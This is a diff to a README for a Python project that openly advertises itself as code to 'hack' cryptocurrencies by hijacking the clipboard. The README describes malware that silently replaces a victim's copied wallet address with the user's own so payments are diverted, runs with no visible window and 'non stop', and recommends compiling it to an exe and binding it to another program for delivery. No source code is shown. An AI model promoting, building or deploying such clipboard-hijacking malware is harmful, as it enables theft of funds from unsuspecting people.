@@ -1,9 +1,9 @@
-# Bitcoin-hack-with-clipboard-in-python
-A great code to hack bitcoin with clipboard! 
+# Cryptocurrencies-hack-with-clipboard-in-python
+A great code to hack cryptocurrencies with clipboard! 
 
-- This source code replaces the given wallet address with original wallet address when the target wants to transfer bitcoins, and the bitcoins are sent to you!
+- This source code replaces the given wallet address with original wallet address when the target wants to transfer cryptocurrencies, and the cryptocurrencies are sent to you!
 - No terminal page visible !
-
+- Non stop!
 
 Download the project. Then go to the project directory in the terminal and type:
 
@@ -17,6 +17,6 @@ Download the project. Then go to the project directory in the terminal and type:
 
 Next open the source code and fill out config() function fields in source code !
 
-Attention ! This code works perfectly when it is converted to exe!
+Attention! This code works perfectly if it is converted to exe and binded!
 
-Done ! Enjoy !
+Done ! Enjoy :)!
